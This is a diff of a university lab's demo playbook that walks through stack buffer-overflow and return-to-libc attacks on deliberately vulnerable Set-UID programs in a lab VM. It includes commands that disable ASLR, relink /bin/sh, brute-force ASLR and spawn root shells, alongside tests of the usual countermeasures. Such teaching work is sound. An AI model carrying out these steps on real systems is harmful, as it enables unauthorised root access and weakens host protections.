@@ -1,28 +1,227 @@
+# CEG4799/CSI4539 Lab 2 - Track 1 Demo Playbook (E1/T1 -> E5/T5)
+# Working directory for all commands unless stated otherwise:
 cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
-make stack-L1
-ls -l stack-L1 stack-L1-dbg
-file stack-L1
-printf '\0' > badfile
-gdb -q -x t1.gdb ./stack-L1-dbg
 
-# T2 / E2
-cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Labsetup
-make
-objdump -Mintel -d hello mysh64 another_sh64
-objcopy -O binary -j .text another_sh64 another_sh64.text.bin
-xxd -p -c 20 another_sh64.text.bin
-# Paste the xxd output into ori_sh in convert.py.
-nano convert.py
-python3 convert.py
-cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Labsetup/shellcode
-gcc -z execstack -o a64.out call_shellcode.c
-./a64.out
-# Type exit when the shell opens.
+# -----------------------------
+# 0) Baseline setup and checks
+# -----------------------------
+# Build all required vulnerable binaries for Levels 1-3.
+make stack-L1 stack-L2 stack-L3
 
-# T3 / E3: Level 1 direct Set-UID demonstration
-cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+# Confirm Set-UID and 32/64-bit formats.
+ls -l stack-L1 stack-L2 stack-L3
+file stack-L1 stack-L2 stack-L3
+
+# Keep deterministic addresses for Levels 1-3.
 sudo sysctl -w kernel.randomize_va_space=0
 sysctl kernel.randomize_va_space
+
+
+# ----------
+# E1/T1 - Analysis
+# ----------
+# Position for E1/T1 commands:
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+
+# Measure exact overflow geometry for Level-1 in a reproducible way.
+# t1.gdb prints: &buffer, ebp, return-slot address, and offset.
+gdb -q -batch -x t1.gdb ./stack-L1-dbg
+
+# Expected:
+# - offset to saved return is the calibrated value used by exploit.py
+# - values are used as evidence in report/demo.
+
+
+# ----------
+# E2/T2 - Shellcode
+# ----------
+# Position for E2/T2 commands:
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/shellcode
+
+# Validate standalone shellcode execution before using it in overflow payloads.
+make clean
+make
+file a32.out a64.out
+
+# Run shellcode harnesses.
+# Expected: interactive shell prompt appears (type /usr/bin/id then exit).
+./a32.out
+./a64.out
+
+# Return to overflow code directory for E3 onward.
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+
+# Keep /bin/sh baseline for the base overflow stages.
+sudo ln -sf /bin/zsh /bin/sh
+readlink -f /bin/sh
+
+
+# ----------------
+# E3/T3 - Level 1
+# ----------------
+# Position for E3/T3 commands:
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+
+# Generate Level-1 payload (offset=112, ret calibrated for this VM).
 python3 exploit.py
+
+# Quick payload sanity check: return address bytes at offset 112.
 xxd -g1 -s 112 -l 4 badfile
+
+# Run exploit and execute id inside spawned shell.
+# Expected: euid=0(root).
 printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1
+
+
+# ----------------
+# E3/T3 - Level 2
+# ----------------
+# Build boundary binaries to demonstrate one payload for BUF_SIZE in [100,200].
+gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -o stack-L2-100 stack.c
+gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -m32 -o stack-L2-200 stack.c
+sudo chown root stack-L2-100 stack-L2-200
+sudo chmod 4755 stack-L2-100 stack-L2-200
+
+# Generate one universal payload:
+# - shellcode placed after sprayed overwrite region
+# - same ret sprayed over candidate offsets 112..212
+python3 exploit_l2.py
+
+# Verify sprayed return addresses and shellcode placement.
+xxd -g1 -s 112 -l 16 badfile
+xxd -g1 -s 420 -l 32 badfile
+
+# Same badfile must work for both boundaries.
+# Expected: euid=0(root) in both runs.
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L2-100
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L2-200
+
+
+# ----------------
+# E3/T3 - Level 3
+# ----------------
+# Generate 64-bit payload using calibrated direct-run parameters:
+# offset=208, ret=0x7fffffffe580 (this VM/config).
+python3 exploit_l3.py
+
+# Verify 64-bit return overwrite bytes at offset 208.
+xxd -g1 -s 208 -l 8 badfile
+
+# Run 64-bit exploit.
+# Expected: euid=0(root).
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L3
+
+
+# ---------------------------
+# E4/T4 - Countermeasures
+# ---------------------------
+
+# Position for E4/T4 commands:
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+
+# T4-a) Dash protection: show failure without setuid/setgid shellcode.
+sudo ln -sf /bin/dash /bin/sh
+readlink -f /bin/sh
+python3 exploit.py
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1
+# Expected: user context (no effective root) because dash drops privilege.
+
+# T4-a bypass) Use payload that calls setuid(0)+setgid(0) before execve.
+python3 exploit_l1_setuid.py
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1
+# Expected: uid=0(root), gid=0(root).
+
+# Restore /bin/sh baseline after dash test.
+sudo ln -sf /bin/zsh /bin/sh
+readlink -f /bin/sh
+
+# T4-b) ASLR active + brute-force approach.
+sudo sysctl -w kernel.randomize_va_space=2
+sysctl kernel.randomize_va_space
+python3 exploit.py
+
+# Repeated direct attempts with varying return guesses.
+# Usage: ./brute-force-aslr.sh [max_attempts] [min_ret] [max_ret] [step]
+./brute-force-aslr.sh 80000
+# Expected: either
+# - SUCCESS after N attempts + euid=0(root), or
+# - no success within cap (increase max_attempts).
+
+# Return to deterministic baseline after ASLR test.
+sudo sysctl -w kernel.randomize_va_space=0
+sysctl kernel.randomize_va_space
+
+# T4-c) StackGuard enabled: exploit should fail.
+gcc -DBUF_SIZE=100 -m32 -z execstack -fstack-protector -o stack-L1-canary stack.c
+sudo chown root stack-L1-canary
+sudo chmod 4755 stack-L1-canary
+python3 exploit.py
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1-canary
+# Expected: stack smashing detected / abort.
+
+# T4-d) NX enabled: exploit should fail.
+gcc -DBUF_SIZE=100 -m32 -z noexecstack -fno-stack-protector -o stack-L1-nx stack.c
+sudo chown root stack-L1-nx
+sudo chmod 4755 stack-L1-nx
+python3 exploit.py
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1-nx
+# Expected: segmentation fault (injected stack code not executable).
+
+
+# ----------------
+# E5/T5 - Return-to-libc (retlib.c)
+# ----------------
+# Position for E5/T5 commands:
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Return_to_Libc_Labsetup/Labsetup
+
+# Build retlib (32-bit, NX enabled, no canary, Set-UID root).
+make clean
+make
+ls -l retlib
+file retlib
+
+# Baseline controls for reproducibility.
+sudo sysctl -w kernel.randomize_va_space=0
+sudo ln -sf /bin/zsh /bin/sh
+readlink -f /bin/sh
+
+# Provide command string used by system().
+export MYSH=/bin/sh
+
+# Measure current /bin/sh string address in this same shell environment.
+./prtenv
+
+# Generate badfile using:
+# Y=28 (overwrite saved return with system),
+# Z=32 (return from system to exit),
+# X=36 (argument to system -> /bin/sh address from prtenv).
+# system() and exit() addresses are from this VM/libc with ASLR off.
+python3 exploit_gen.py --sh "$(./prtenv | awk '/MYSH address/{print $3}')" --system 0xf7e0a360 --exit 0xf7dfcec0
+xxd -g4 -l 48 badfile
+
+# Run return-to-libc attack.
+# Expected: euid=0(root) from id, without executing injected stack code.
+printf '/usr/bin/id\nexit\n' | ./retlib
+
+# Variation A (is exit needed?): set exit address to 0 and rerun.
+# Expected: shell may still spawn, but post-shell return is less stable.
+
+# Variation B (rename effect): changing binary name shifts environment addresses.
+# Recompute MYSH with a same-shell helper and regenerate badfile before rerunning.
+# Example:
+#   cp retlib retlib2
+#   cp prtenv prtenv2
+#   export MYSH=/bin/sh
+#   ./prtenv2
+#   python3 exploit_gen.py --sh <new_addr> --system 0xf7e0a360 --exit 0xf7dfcec0
+#   printf '/usr/bin/id\nexit\n' | ./retlib2
+
+
+# ---------------------------
+# End-of-demo safety reset
+# ---------------------------
+# Keep environment in the standard lab baseline.
+sudo ln -sf /bin/zsh /bin/sh
+sudo sysctl -w kernel.randomize_va_space=0
+readlink -f /bin/sh
+sysctl kernel.randomize_va_space
